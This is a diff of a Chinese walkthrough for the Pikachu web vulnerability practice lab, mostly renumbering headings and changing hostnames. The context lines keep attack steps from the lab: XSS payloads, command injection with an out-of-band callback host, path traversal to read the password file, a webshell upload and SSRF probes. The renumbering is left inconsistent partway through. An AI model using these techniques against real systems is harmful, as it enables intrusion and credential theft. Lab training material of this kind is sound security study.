@@ -1,32 +1,32 @@
-一个综合 Web 靶场。
+一个综合 Web 靶场.
 
-## 1 安装
+## 1. 安装
 
 安装依赖
 
-```shell
-┌──(root㉿purple)-[~]
+```
+┌──(root@debian)-[~]
 └─# apt install -y apache2 mariadb-server mariadb-client php php-mysqli php-gd libapache2-mod-php
 ```
 
 下载
 
-```shell
-┌──(root㉿purple)-[~]
+```
+┌──(root@debian)-[~]
 └─# git clone https://github.com/zhuifengshaonianhanlu/pikachu.git /var/www/html/pikachu
 ```
 
 修改运行权限
 
-```shell
-┌──(root㉿purple)-[~]
+```
+┌──(root@debian)-[~]
 └─# chown -R www-data:www-data /var/www/html/
 ```
 
-配置数据库管理系统密码
+配置数据库密码
 
-```shell
-┌──(root㉿purple)-[~]
+```
+┌──(root@debian)-[~]
 └─# vim /var/www/html/pikachu/inc/config.inc.php
 ```
 
@@ -34,19 +34,21 @@
 11	define('DBPW', '123456');//将root修改为连接mysql的密码，如果改了还是连接不上，请先手动连接下你的数据库，确保数据库服务没问题在说!
 ```
 
+## 2. 初始化
+
+访问链接初始化
+
+> http://debian/pikachu/install.php
+
+## 3. 使用
+
 访问
 
-> http://debain.local/pikachu/install.php
+> http://debian/pikachu/index.php
 
-## 2 使用
+### 3.1. 暴力破解
 
-访问
-
-> http://debain.local/pikachu/index.php
-
-### 2.1 暴力破解
-
-### 2.1.1 基于表单的暴力破解
+### 3.1.1. 基于表单的暴力破解
 
 > http://centos7-6.local/pikachu/vul/burteforce/bf_form.php
 
@@ -137,7 +139,7 @@ admin
 
 ![没有检测到反馈特征的则爆破成功](./../../../../images/Pikachu/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E6%B2%A1%E6%9C%89%E6%A3%80%E6%B5%8B%E5%88%B0%E5%8F%8D%E9%A6%88%E7%89%B9%E5%BE%81%E7%9A%84%E5%88%99%E7%88%86%E7%A0%B4%E6%88%90%E5%8A%9F.png)
 
-### 2.1.2 验证码绕过(on server)
+### 3.1.2. 验证码绕过(on server)
 
 > http://centos7-6.local/pikachu/vul/burteforce/bf_server.php
 
@@ -283,7 +285,7 @@ username or password is not exists
 
 ![若没有检测到反馈特征的则爆破成功](./../../../../images/Pikachu/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87(on%20server)/%E8%8B%A5%E6%B2%A1%E6%9C%89%E6%A3%80%E6%B5%8B%E5%88%B0%E5%8F%8D%E9%A6%88%E7%89%B9%E5%BE%81%E7%9A%84%E5%88%99%E7%88%86%E7%A0%B4%E6%88%90%E5%8A%9F.png)
 
-### 2.1.3 验证码绕过(on client)
+### 3.1.3. 验证码绕过(on client)
 
 > http://centos7-6.local/pikachu/vul/burteforce/bf_client.php
 
@@ -415,13 +417,13 @@ username or password is not exists
 
 ![若没有检测到反馈特征的则爆破成功](./../../../../images/Pikachu/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87(on%20client)/%E8%8B%A5%E6%B2%A1%E6%9C%89%E6%A3%80%E6%B5%8B%E5%88%B0%E5%8F%8D%E9%A6%88%E7%89%B9%E5%BE%81%E7%9A%84%E5%88%99%E7%88%86%E7%A0%B4%E6%88%90%E5%8A%9F.png)
 
-### 2.1.4 token 防爆破
+### 3.1.4. token 防爆破
 
 > http://centos7-6.local/pikachu/vul/burteforce/bf_token.php
 
 当使用 token 时可以使用 burp 或者 selenium 爆破，burp 仅支持在用户名或者密码已知的情况下使用
 
-### 2.1.4.1 burp
+### 3.1.4.1. burp
 
 假设用户名已知，提交用户名和任意密码，返回 `username or password is not exists～` 
 
@@ -498,7 +500,7 @@ username or password is not exists
 
 ![若没有检测到反馈特征的则爆破成功](./../../../../images/Pikachu/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/token%20%E9%98%B2%E7%88%86%E7%A0%B4/%E8%8B%A5%E6%B2%A1%E6%9C%89%E6%A3%80%E6%B5%8B%E5%88%B0%E5%8F%8D%E9%A6%88%E7%89%B9%E5%BE%81%E7%9A%84%E5%88%99%E7%88%86%E7%A0%B4%E6%88%90%E5%8A%9F.png)
 
-### 2.1.4.2 selenium
+### 3.1.4.2. selenium
 
 下载 geckodriver
 
@@ -646,9 +648,9 @@ browser.quit()
 
 > 爆破成功的用户名和密码会存储在 /root/result.txt
 
-### 2.2 Cross-Site Scripting
+### 3.2. Cross-Site Scripting
 
-### 2.2.1 反射型xss(get)
+### 3.2.1. 反射型xss(get)
 
 > http://centos7-6.local/pikachu/vul/xss/xss_reflected_get.php
 
@@ -684,7 +686,7 @@ browser.quit()
 
 > 成功弹窗
 
-### 2.2.2 反射型xss(post)
+### 3.2.2. 反射型xss(post)
 
 > http://centos7-6.local/pikachu/vul/xss/xsspost/post_login.php
 
@@ -705,7 +707,7 @@ admin
 
 > 成功弹窗
 
-### 2.2.3 存储型xss
+### 3.2.3. 存储型xss
 
 > http://centos7-6.local/pikachu/vul/xss/xss_stored.php
 
@@ -721,7 +723,7 @@ admin
 
 > 成功在控制台返回
 
-### 2.2.4 DOM型xss
+### 3.2.4. DOM型xss
 
 > http://centos7-6.local/pikachu/vul/xss/xss_dom.php
 
@@ -801,7 +803,7 @@ admin
 
 ![将鼠标移至图像，触发事件](./../../../../images/Pikachu/Cross-Site%20Scripting/DOM%E5%9E%8Bxss/%E5%B0%86%E9%BC%A0%E6%A0%87%E7%A7%BB%E8%87%B3%E5%9B%BE%E5%83%8F%EF%BC%8C%E8%A7%A6%E5%8F%91%E4%BA%8B%E4%BB%B6.png)
 
-### 2.2.5 DOM型xss-x
+### 3.2.5. DOM型xss-x
 
 > http://centos7-6.local/pikachu/vul/xss/xss_dom.php
 
@@ -892,7 +894,7 @@ admin
 
 ![将鼠标移至图像，触发事件](./../../../../images/Pikachu/Cross-Site%20Scripting/DOM%E5%9E%8Bxss-x/%E5%B0%86%E9%BC%A0%E6%A0%87%E7%A7%BB%E8%87%B3%E5%9B%BE%E5%83%8F%EF%BC%8C%E8%A7%A6%E5%8F%91%E4%BA%8B%E4%BB%B6.png)
 
-### 2.2.6 xss之盲打
+### 3.2.6. xss之盲打
 
 > http://centos7-6.local/pikachu/vul/xss/xssblind/xss_blind.php
 
@@ -1019,7 +1021,7 @@ Possible Hashs:
 
 > 得到密码为：123456
 
-### 2.2.7 xss之过滤
+### 3.2.7. xss之过滤
 
 > http://centos7-6.local/pikachu/vul/xss/xss_01.php
 
@@ -1107,7 +1109,7 @@ alert(1);
 
 > 成功绕过
 
-### 2.2.8 xss之htmlspecialchars
+### 3.2.8. xss之htmlspecialchars
 
 >http://centos7-6.local/pikachu/vul/xss/xss_02.php
 
@@ -1143,7 +1145,7 @@ alert(1);
 
 ![点击反馈，触发事件](./../../../../images/Pikachu/Cross-Site%20Scripting/xss%E4%B9%8Bhtmlspecialchars/%E7%82%B9%E5%87%BB%E5%8F%8D%E9%A6%88%EF%BC%8C%E8%A7%A6%E5%8F%91%E4%BA%8B%E4%BB%B6.png)
 
-### 2.2.9 xss之href输出
+### 3.2.9. xss之href输出
 
 > http://centos7-6.local/pikachu/vul/xss/xss_03.php
 
@@ -1175,7 +1177,7 @@ javascript:alert(1);
 
 ![点击反馈，触发事件](./../../../../images/Pikachu/Cross-Site%20Scripting/xss%E4%B9%8Bhref%E8%BE%93%E5%87%BA/%E7%82%B9%E5%87%BB%E5%8F%8D%E9%A6%88%EF%BC%8C%E8%A7%A6%E5%8F%91%E4%BA%8B%E4%BB%B6.png)
 
-### 2.2.10 xss之js输出
+### 3.2.10. xss之js输出
 
 > http://centos7-6.local/pikachu/vul/xss/xss_04.php
 
@@ -1227,9 +1229,9 @@ javascript:alert(1);
 >
 > 使用 `;` 结束 `$ms='#'` 后才能执行 `alert(1)` 
 
-### 2.3 RCE
+### 2.3. RCE
 
-### 2.3.1 exec "ping"
+### 2.3.1. exec "ping"
 
 > http://centos7-6.local/pikachu/vul/rce/rce_ping.php
 
@@ -1274,13 +1276,13 @@ xdeg7e5md5hw37w3sdscllarkiq9ez2o.oastify.com
 
 ![执行拼接命令](./../../../../images/Pikachu/RCE/exex%20%E2%80%9Cping%E2%80%9D/%E6%89%A7%E8%A1%8C%E6%8B%BC%E6%8E%A5%E5%91%BD%E4%BB%A4.png)
 
-### 2.3.2 exec "eval"
+### 2.3.2. exec "eval"
 
 > http://centos7-6.local/pikachu/vul/rce/rce_eval.php
 
-### 2.4 File Inclusion
+### 2.4. File Inclusion
 
-### 2.4.1 File Inclusion(local)
+### 2.4.1. File Inclusion(local)
 
 查看任意一个球员可以得到 url
 
@@ -1348,7 +1350,7 @@ http://cent7-6.local/pikachu/vul/fileinclude/fi_remote.php?filename=../../../../
 
 > 成功得到密码文件
 
-### 2.5 Unsafe Filedownload
+### 2.5. Unsafe Filedownload
 
 尝试下载任意一个文件，并获取其 url
 
@@ -1376,9 +1378,9 @@ http://cent7-6.local/pikachu/vul/unsafedownload/execdownload.php?filename=../../
 
 > 成功得到密码文件
 
-### 2.6 unsafe upfileupload
+### 2.6. unsafe upfileupload
 
-### 2.6.1 client check
+### 2.6.1. client check
 
 在浏览器开发者工具中使用 `Curl+Shift+P` 运行命令禁用 `javascript` 
 
@@ -1397,7 +1399,7 @@ hacker
 
 > 成功
 
-### 2.6.2 MIME type
+### 2.6.2. MIME type
 
 在 burp 开启拦截，上传 `webshell.jpg`
 
@@ -1432,7 +1434,7 @@ Content-Disposition: form-data; name="submit"
 >
 > 使用 AntSword 连接即可
 
-### 2.6.3 getPikachuize
+### 2.6.3. getPikachuize
 
 在 kali 创建 php 文件
 
@@ -1461,9 +1463,9 @@ hacker
 
 > 成功
 
-### 2.7 SSRF
+### 2.7. SSRF
 
-### 2.7.1 SSRF(curl)
+### 2.7.1. SSRF(curl)
 
 > http://centos7-6.local/pikachu/vul/ssrf/ssrf_curl.php
 
@@ -1505,7 +1507,7 @@ Protocols: dict file ftp ftps gopher http https imap imaps ldap ldaps pop3 pop3s
 Features: AsynchDNS GSS-Negotiate IDN IPv6 Largefile NTLM NTLM_WB SSL libz unix-sockets
 ```
 
-### 2.7.2 SSRF(file_get_content)
+### 2.7.2. SSRF(file_get_content)
 
 > http://centos7-6.local/pikachu/vul/ssrf/ssrf_fgc.php
 
@@ -1557,7 +1559,7 @@ define('DBPORT', '3306');//将3306修改为mysql的连接端口，默认tcp3306
 http://centos7-6.local/pikachu/vul/ssrf/ssrf_fgc.php?url=http://127.0.0.1:3306
 ```
 
-### 2.7.3 ssrf-gopher 协议利用
+### 2.7.3. ssrf-gopher 协议利用
 
 > 利用 ssrf-gopher 协议可以对 ftp、memcache、mysql、telnet、redis 等服务进行攻击，可以构造发送 get  post 请求包
 
